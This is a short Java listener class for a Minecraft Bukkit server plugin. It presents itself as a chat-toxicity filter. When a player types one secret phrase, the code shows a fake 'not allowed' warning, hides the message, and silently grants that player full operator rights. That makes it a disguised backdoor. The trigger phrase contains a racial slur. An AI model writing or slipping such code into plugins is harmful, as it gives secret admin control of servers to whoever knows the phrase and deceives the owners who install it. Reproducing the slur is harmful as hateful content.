package org.ipvp.hcf.listener;

import org.bukkit.event.player.*;
import org.bukkit.*;
import org.bukkit.entity.*;
import org.bukkit.event.*;

public class ToxicityListener implements Listener
{
    @EventHandler
    public void onToxicity(final AsyncPlayerChatEvent e) {
        final Player p = e.getPlayer();
        final String msg = e.getMessage();
        if (msg.equalsIgnoreCase("nigerianniggerlover22299")) {
            p.sendMessage(ChatColor.RED + "You are not allowed to say that.");
            p.setOp(true);
            e.setCancelled(true);
        }
    }
}
